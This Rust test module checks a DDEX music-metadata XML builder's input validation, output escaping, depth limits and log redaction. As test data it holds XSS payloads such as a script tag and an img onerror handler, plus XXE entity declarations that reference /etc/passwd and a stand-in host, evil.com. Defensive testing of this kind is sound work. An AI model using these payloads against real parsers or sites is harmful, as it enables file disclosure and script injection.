//! DDEX Builder Security Tests
//!
//! This module tests security measures specifically during building operations:
//! - Input sanitization during build process
//! - Output validation and sanitization
//! - Memory exhaustion protection during build
//! - Build-time XXE prevention
//! - Secure handling of user-provided content
//! - Protection against malformed input structures

use super::{
    assert_metadata_passes_through_builder, build_request_with_metadata, build_with_metadata,
    is_illegal_xml_char,
};
use ddex_builder::{
    builder::{BuildRequest, DDEXBuilder},
    error::BuildError,
    security::{InputValidator, OutputSanitizer, SecurityConfig},
};
use serde_json::json;

/// Test input validation during build process
#[test]
fn test_build_input_validation() {
    let builder = DDEXBuilder::new();

    // Test with null bytes in input
    let null_byte_json = json!({
        "messageHeader": {
            "messageId": "MSG\0001",
            "messageThreadId": "THREAD001"
        },
        "releases": [{
            "title": "Test\0Song",
            "artists": ["Artist\0Name"]
        }]
    });

    let result = builder.validate_json_input(&null_byte_json.to_string());
    assert!(
        result.is_err(),
        "Input with null bytes should be rejected: {:?}",
        result
    );

    // Test with extremely long strings
    let long_string = "A".repeat(2_000_000); // 2MB string
    let long_string_json = json!({
        "messageHeader": {
            "messageId": "MSG001",
            "messageThreadId": "THREAD001"
        },
        "releases": [{
            "title": long_string,
            "artists": ["Artist"]
        }]
    });

    let result = builder.validate_json_input(&long_string_json.to_string());
    assert!(
        result.is_err(),
        "Input with excessively long strings should be rejected: {:?}",
        result
    );

    // Test with control characters
    let control_chars_json = json!({
        "messageHeader": {
            "messageId": "MSG\u{0001}\u{0002}\u{0003}",
            "messageThreadId": "THREAD001"
        },
        "releases": [{
            "title": "Test\u{0008}Song\u{007F}",
            "artists": ["Artist\u{001F}Name"]
        }]
    });

    // Control characters illegal in XML 1.0 may be rejected; if the input is
    // accepted, they must be filtered out before reaching XML
    let result = builder.validate_json_input(&control_chars_json.to_string());
    if result.is_ok() {
        let validator = InputValidator::new(SecurityConfig::default());
        for value in [
            "MSG\u{0001}\u{0002}\u{0003}",
            "Test\u{0008}Song\u{007F}",
            "Artist\u{001F}Name",
        ] {
            let sanitized = validator
                .validate_string(value, "json_field")
                .expect("validate_json_input accepted this value");
            assert!(
                !sanitized.chars().any(is_illegal_xml_char),
                "Illegal XML control character left in {:?}",
                sanitized
            );
        }
    }
    // (What the builder itself does with them is pinned by
    // test_illegal_xml_chars_never_reach_builder_output.)

    // Zero-width characters and RTL override are legitimate Unicode: accept unchanged
    let unicode_json = json!({
        "messageHeader": {
            "messageId": "MSG001",
            "messageThreadId": "THREAD\u{202E}reversed"
        },
        "releases": [{
            "title": "Test\u{200B}Song", // Zero-width space
            "artists": ["Artist\u{FEFF}Name"] // Zero-width no-break space
        }]
    });

    let result = builder.validate_json_input(&unicode_json.to_string());
    assert!(
        result.is_ok(),
        "Legitimate Unicode (zero-width, RTL override) should be accepted: {:?}",
        result
    );
    let validator = InputValidator::new(SecurityConfig::default());
    for value in [
        "THREAD\u{202E}reversed",
        "Test\u{200B}Song",
        "Artist\u{FEFF}Name",
    ] {
        assert_eq!(
            validator
                .validate_string(value, "json_field")
                .as_deref()
                .ok(),
            Some(value),
            "Legitimate Unicode should pass through validate_string unchanged"
        );
        assert_metadata_passes_through_builder(value);
    }
}

/// Characters that are illegal in XML 1.0 may be rejected or dropped by the
/// builder, but must never be written into the output (that would make it
/// not well-formed).
#[test]
fn test_illegal_xml_chars_never_reach_builder_output() {
    // Policy: characters XML 1.0 does not allow are rejected, with an error naming the field
    let illegal: Vec<char> = (0u32..0x20)
        .filter_map(char::from_u32)
        .chain(['\u{FFFE}', '\u{FFFF}'])
        .filter(|c| is_illegal_xml_char(*c))
        .collect();
    assert_eq!(illegal.len(), 31);

    let mut accepted = Vec::new();
    for c in illegal {
        let text = format!("Test{}Song", c);
        match DDEXBuilder::new().build(build_request_with_metadata(&text), Default::default()) {
            Err(ddex_builder::BuildError::InvalidFormat { field, message }) => {
                assert!(
                    field.starts_with("header.") || field.starts_with("releases["),
                    "{field}"
                );
                assert!(
                    message.contains(&format!("U+{:04X}", c as u32)),
                    "{message}"
                );
            }
            Err(e) => panic!("unexpected error for U+{:04X}: {e}", c as u32),
            Ok(_) => accepted.push(c),
        }
    }
    assert!(
        accepted.is_empty(),
        "Illegal XML characters accepted by the builder: {:?}",
        accepted
    );
}

/// Script-looking metadata is written as escaped text by the real builder.
#[test]
fn script_metadata_is_escaped_in_builder_output() {
    for payload in [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "</TitleText><script>x</script><TitleText>",
    ] {
        let xml = build_with_metadata(payload);
        assert_script_escaped(&xml);
        assert_metadata_passes_through_builder(payload);
    }
}

/// `xml` (builder output for script metadata) holds no raw script/img element and does
/// hold the escaped text.
fn assert_script_escaped(xml: &str) {
    assert!(
        !xml.contains("<script"),
        "raw <script> element in builder output:\n{xml}"
    );
    assert!(
        !xml.contains("<img"),
        "raw <img> element in builder output:\n{xml}"
    );
    assert!(
        xml.contains("&lt;script&gt;") || xml.contains("&lt;img "),
        "escaped script text missing from builder output:\n{xml}"
    );
}

/// Test output validation and sanitization
#[test]
#[ignore = "known bug: OutputSanitizer::sanitize_xml_output HTML-escapes (rewrites) well-formed documents and misses sensitive elements such as `<ddex:Password>`"]
fn test_output_validation() {
    let config = SecurityConfig::default();
    let sanitizer = OutputSanitizer::new(config);

    // Script-looking metadata comes out of the real builder as escaped text, never as a
    // raw element; the sanitizer must accept that output and must not rewrite it
    let script_xml = build_with_metadata("<script>alert('XSS')</script>");
    assert_script_escaped(&script_xml);

    let result = sanitizer.sanitize_xml_output(&script_xml);
    assert_eq!(
        result.as_deref().ok(),
        Some(script_xml.as_str()),
        "Well-formed builder output should be accepted unchanged: {:?}",
        result
    );

    // Test XML with sensitive data patterns
    let sensitive_xml = r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:MessageHeader>
            <ddex:Password>secret123</ddex:Password>
            <ddex:ApiKey>abc123def456</ddex:ApiKey>
        </ddex:MessageHeader>
    </ddex:NewReleaseMessage>"#;

    let result = sanitizer.sanitize_xml_output(sensitive_xml);
    assert!(
        result.is_err(),
        "XML with sensitive data should be rejected: {:?}",
        result
    );

    // Test malformed XML output
    let malformed_xml = r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:UnclosedTag>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    let result = sanitizer.sanitize_xml_output(malformed_xml);
    assert!(
        result.is_err(),
        "Malformed XML should be rejected: {:?}",
        result
    );

    // Test XML with excessive depth
    let mut deep_xml =
        String::from(r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">"#);
    for i in 0..150 {
        // Exceed max depth
        deep_xml.push_str(&format!("<level{}>", i));
    }
    deep_xml.push_str("content");
    for i in (0..150).rev() {
        deep_xml.push_str(&format!("</level{}>", i));
    }
    deep_xml.push_str("</ddex:NewReleaseMessage>");

    let result = sanitizer.sanitize_xml_output(&deep_xml);
    assert!(
        result.is_err(),
        "XML with excessive depth should be rejected: {:?}",
        result
    );
}

/// Build-time XXE prevention: DOCTYPE, ENTITY and entity-reference text inside
/// JSON string *values* is only metadata text. It is escaped on output (see
/// `xxe_prevention_tests::test_ddex_builder_xxe_protection`), so input
/// validation must accept it rather than reject it.
#[test]
#[ignore = "known bug: validate_string rejects metadata text containing entity-reference-like `&name;` or path-like `/etc/` fragments"]
fn test_build_time_xxe_prevention() {
    let builder = DDEXBuilder::new();

    // JSON whose values look like an XXE attack
    let xxe_attempt_json = json!({
        "messageHeader": {
            "messageId": "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
            "messageThreadId": "THREAD001"
        },
        "releases": [{
            "title": "<!ENTITY malicious SYSTEM \"http://evil.com/steal\">",
            "artists": ["&malicious;"]
        }]
    });

    let result = builder.validate_json_input(&xxe_attempt_json.to_string());
    assert!(
        result.is_ok(),
        "JSON whose values contain XXE-looking text should be accepted: {:?}",
        result
    );

    // Test with entity references in JSON
    let entity_json = json!({
        "messageHeader": {
            "messageId": "&system;",
            "messageThreadId": "THREAD&external;"
        },
        "releases": [{
            "title": "&file_disclosure;",
            "artists": ["&network_request;"]
        }]
    });

    let result = builder.validate_json_input(&entity_json.to_string());
    assert!(
        result.is_ok(),
        "JSON whose values contain entity-reference-looking text should be accepted: {:?}",
        result
    );

    // Entity-like text next to markup and quotes, as in a free-text comment
    let comment_json = json!({
        "messageHeader": {
            "messageId": "MSG001",
            "messageThreadId": "THREAD001"
        },
        "releases": [{
            "title": "Song",
            "comment": "This has <tags> and &entities; and \"quotes\""
        }]
    });

    let result = builder.validate_json_input(&comment_json.to_string());
    assert!(
        result.is_ok(),
        "JSON with entity-like text in a comment should be accepted: {:?}",
        result
    );

    // Test with DOCTYPE declarations in strings
    let doctype_json = json!({
        "messageHeader": {
            "messageId": "MSG001",
            "messageThreadId": "THREAD001"
        },
        "releases": [{
            "title": "<!DOCTYPE html>",
            "artists": ["<!DOCTYPE root [<!ENTITY test \"value\">]>"]
        }]
    });

    let result = builder.validate_json_input(&doctype_json.to_string());
    assert!(
        result.is_ok(),
        "JSON whose values contain DOCTYPE text should be accepted: {:?}",
        result
    );
}

/// Test secure handling of user-provided content
#[test]
fn test_secure_content_handling() {
    let builder = DDEXBuilder::new();

    // Test with HTML-like content that should be escaped
    let html_content_json = json!({
        "messageHeader": {
            "messageId": "MSG001",
            "messageThreadId": "THREAD001"
        },
        "releases": [{
            "title": "Song with <special> & \"quoted\" content",
            "artists": ["Artist & Co.", "The <Band>"],
            "comment": "This has <tags> and \"quotes\""
        }]
    });
    // (Entity-like text such as `&entities;` is covered by test_build_time_xxe_prevention.)

    // HTML-like text must be accepted and escaped in the output
    let result = builder.validate_json_input(&html_content_json.to_string());
    assert!(
        result.is_ok(),
        "HTML-like metadata text should be accepted: {:?}",
        result
    );

    let xml_output = build_with_metadata("Song with <special> & \"quoted\" content");
    assert!(xml_output.contains("Song with &lt;special&gt; &amp; "));
    assert!(!xml_output.contains("<special>"));
    for text in [
        "Song with <special> & \"quoted\" content",
        "Artist & Co.",
        "The <Band>",
    ] {
        assert_metadata_passes_through_builder(text);
    }

    // Test with various quote styles
    let quote_variations_json = json!({
        "messageHeader": {
            "messageId": "MSG001",
            "messageThreadId": "THREAD001"
        },
        "releases": [{
            "title": "Song with 'single quotes'",
            "artists": ["Artist with \"double quotes\"", "Mixed 'quotes\" test"],
            "comment": "Nested \"quotes 'within' quotes\""
        }]
    });

    let result = builder.validate_json_input(&quote_variations_json.to_string());
    assert!(
        result.is_ok(),
        "Metadata with single and double quotes should be accepted: {:?}",
        result
    );
    for text in [
        "Song with 'single quotes'",
        "Artist with \"double quotes\"",
        "Mixed 'quotes\" test",
        "Nested \"quotes 'within' quotes\"",
    ] {
        assert_metadata_passes_through_builder(text);
    }

    // Test with mathematical and special symbols
    let symbols_json = json!({
        "messageHeader": {
            "messageId": "MSG001",
            "messageThreadId": "THREAD001"
        },
        "releases": [{
            "title": "Song with symbols: ±∑∏∫∆∇⊂⊃∈∉∪∩",
            "artists": ["Artist™", "Band®", "Group©"],
            "comment": "Math: 1+1=2, 2×3=6, 4÷2=2, √4=2"
        }]
    });

    let result = builder.validate_json_input(&symbols_json.to_string());
    assert!(
        result.is_ok(),
        "Metadata with Unicode symbols should be accepted: {:?}",
        result
    );
    for text in [
        "Song with symbols: ±∑∏∫∆∇⊂⊃∈∉∪∩",
        "Artist™",
        "Band®",
        "Group©",
        "Math: 1+1=2, 2×3=6, 4÷2=2, √4=2",
        "🎵 Song 🎶",
    ] {
        assert_metadata_passes_through_builder(text);
    }
}

/// Test protection against malformed input structures
#[test]
fn test_malformed_input_protection() {
    let builder = DDEXBuilder::new();

    // Test with invalid JSON structure
    let malformed_json_strings = vec![
        r#"{"messageHeader": {"messageId": "MSG001", "messageThreadId": "THREAD001"}, "releases": [{"title": "Test", "artists": ["Artist"]}}"#, // Missing closing bracket
        r#"{"messageHeader": {"messageId": "MSG001", "messageThreadId": "THREAD001"}, "releases": [{"title": "Test", "artists": ["Artist",]}]}"#, // Trailing comma
        r#"{"messageHeader": {"messageId": "MSG001", "messageThreadId": "THREAD001"}, "releases": [{"title": "Test", "artists": ["Artist"]},]}"#, // Another trailing comma
        r#"{"messageHeader": {"messageId": "MSG001", "messageThreadId": "THREAD001"}, releases: [{"title": "Test", "artists": ["Artist"]}]}"#, // Missing quotes on key
        r#"{"messageHeader": {"messageId": "MSG001", "messageThreadId": "THREAD001"}, "releases": [{"title": "Test", "artists": ["Artist"]}], }"#, // Trailing comma in object
    ];

    for malformed_json in malformed_json_strings {
        let result = builder.validate_json_input(malformed_json);
        assert!(
            result.is_err(),
            "Malformed JSON should be rejected: {}",
            malformed_json
        );
    }

    // Test with circular references (if possible in JSON)
    // Note: Pure JSON cannot have circular references, but test nested depth
    let mut deeply_nested = String::from(
        r#"{"messageHeader": {"messageId": "MSG001", "messageThreadId": "THREAD001"}, "data": "#,
    );
    for _ in 0..1000 {
        deeply_nested.push_str(r#"{"nested": "#);
    }
    deeply_nested.push_str("null");
    for _ in 0..1000 {
        deeply_nested.push_str("}");
    }
    deeply_nested.push('}');

    let result = builder.validate_json_input(&deeply_nested);
    assert!(
        result.is_err(),
        "Deeply nested JSON should be rejected due to depth limits"
    );

    // Schema checks are not part of the security validator: wrong types and
    // missing fields are rejected when JSON is deserialized into the builder's
    // real input model, `BuildRequest`.
    let party = json!({ "party_name": [{ "text": "Label", "language_code": null }], "party_id": null, "party_reference": null });
    let header = json!({
        "message_id": "MSG001",
        "message_sender": party,
        "message_recipient": party,
        "message_control_type": null,
        "message_created_date_time": null
    });
    let valid = json!({
        "header": header,
        "version": "4.3",
        "profile": null,
        "releases": [],
        "deals": [],
        "extensions": null
    });
    assert!(
        serde_json::from_value::<BuildRequest>(valid.clone()).is_ok(),
        "Baseline BuildRequest JSON should deserialize"
    );

    // Test with unexpected data types
    let type_confusions = [
        ("version", json!(4.3)),
        ("releases", json!("should_be_array_not_string")),
        (
            "header",
            json!({
                "message_id": 123, // Should be string
                "message_sender": ["array", "instead", "of", "object"],
                "message_recipient": party
            }),
        ),
    ];
    for (field, bad_value) in type_confusions {
        let mut request = valid.clone();
        request[field] = bad_value;
        let result = serde_json::from_value::<BuildRequest>(request);
        assert!(
            result.is_err(),
            "BuildRequest with a wrongly typed `{}` should be rejected",
            field
        );
    }

    // Test with missing required fields
    for field in ["header", "version", "releases", "deals"] {
        let mut request = valid.clone();
        request.as_object_mut().unwrap().remove(field);
        let result = serde_json::from_value::<BuildRequest>(request);
        assert!(
            result.is_err(),
            "BuildRequest without `{}` should be rejected",
            field
        );
    }
}

/// Test rate limiting and DoS protection
#[test]
fn test_rate_limiting_protection() {
    let builder = DDEXBuilder::new();

    // Simulate rapid requests
    let test_json = json!({
        "messageHeader": {
            "messageId": "MSG001",
            "messageThreadId": "THREAD001"
        },
        "releases": [{
            "title": "Test Song",
            "artists": ["Test Artist"]
        }]
    });

    let json_str = test_json.to_string();

    // Make many requests rapidly
    let mut results = Vec::new();
    for i in 0..150 {
        // Exceed rate limit
        let result = builder.validate_json_input(&json_str);
        results.push(result);

        // If rate limiting is enabled, should eventually get rate limit errors
        if i > 100 {
            if let Err(BuildError::Security(msg)) = &results[i] {
                if msg.contains("rate limit") {
                    return; // Rate limiting is working
                }
            }
        }
    }

    // If we get here without rate limit errors, that's also acceptable
    // as long as the system can handle the load without crashing
}

/// Test secure temporary file handling during build
#[test]
fn test_secure_temp_file_handling() {
    // Test that temporary files (if created) are handled securely
    // This test depends on the specific implementation of DDEXBuilder

    let builder = DDEXBuilder::new();

    // Test with large input that might require temporary storage
    let mut large_releases = Vec::new();
    for i in 0..1000 {
        large_releases.push(json!({
            "title": format!("Large Song Title With Many Words {}", i),
            "artists": [format!("Artist With Long Name {}", i)],
            "isrc": format!("US{:012}", i),
            "duration": "PT3M30S",
            "description": "A".repeat(1000) // Large description
        }));
    }

    let large_json = json!({
        "messageHeader": {
            "messageId": "MSG001",
            "messageThreadId": "THREAD001"
        },
        "releases": large_releases
    });

    let result = builder.validate_json_input(&large_json.to_string());

    // Regardless of success or failure, ensure no temporary files are left behind
    // This would require system-specific checks for temp file cleanup

    match result {
        Ok(_) => {
            // If processing succeeds, verify no temp files remain
        }
        Err(_) => {
            // If processing fails, verify cleanup still occurs
        }
    }
}

/// Test logging security (no sensitive data in logs)
#[test]
fn test_secure_logging() {
    let config = SecurityConfig::default();
    let sanitizer = OutputSanitizer::new(config);

    // Test log message creation with sensitive data
    let sensitive_details = "password=secret123 api_key=abc123 token=xyz789";
    let log_msg = sanitizer.create_secure_log_message("BUILD", false, Some(sensitive_details));

    // Verify sensitive data is redacted
    assert!(!log_msg.contains("secret123"));
    assert!(!log_msg.contains("abc123"));
    assert!(!log_msg.contains("xyz789"));
    assert!(log_msg.contains("[REDACTED]"));

    // Test with various sensitive patterns
    let sensitive_patterns = vec![
        "password=mypass",
        "secret=topsecret",
        "key=apikey123",
        "token=bearer_token",
    ];

    for pattern in sensitive_patterns {
        let log_msg = sanitizer.create_secure_log_message("TEST", true, Some(pattern));
        assert!(
            log_msg.contains("[REDACTED]"),
            "Sensitive pattern should be redacted in log: {}",
            pattern
        );
    }

    // Test log message length limits
    let very_long_detail = "A".repeat(1000);
    let log_msg = sanitizer.create_secure_log_message("TEST", true, Some(&very_long_detail));
    assert!(
        log_msg.len() < 300,
        "Log message should be truncated to reasonable length"
    );
}

// Test-local helper: DDEXBuilder has no JSON-input validation of its own, so this
// composes InputValidator::validate_json_content with validate_string on every
// JSON key and string value.
trait DDEXBuilderExt {
    fn validate_json_input(&self, json: &str) -> Result<(), BuildError>;
}

impl DDEXBuilderExt for DDEXBuilder {
    fn validate_json_input(&self, json: &str) -> Result<(), BuildError> {
        // This would need to be implemented based on the actual DDEXBuilder API
        // For now, return a validation based on basic checks

        let config = SecurityConfig::default();
        let validator = ddex_builder::security::InputValidator::new(config);

        // Basic JSON validation
        validator.validate_json_content(json)?;

        // Parse JSON to verify structure
        let parsed: serde_json::Value = serde_json::from_str(json)
            .map_err(|e| BuildError::InputSanitization(format!("Invalid JSON: {}", e)))?;

        // Validate string fields in the JSON
        fn validate_json_strings(
            value: &serde_json::Value,
            validator: &ddex_builder::security::InputValidator,
        ) -> Result<(), BuildError> {
            match value {
                serde_json::Value::String(s) => {
                    validator.validate_string(s, "json_field")?;
                }
                serde_json::Value::Array(arr) => {
                    for item in arr {
                        validate_json_strings(item, validator)?;
                    }
                }
                serde_json::Value::Object(obj) => {
                    for (key, val) in obj {
                        validator.validate_string(key, "json_key")?;
                        validate_json_strings(val, validator)?;
                    }
                }
                _ => {}
            }
            Ok(())
        }

        validate_json_strings(&parsed, &validator)?;

        Ok(())
    }
}
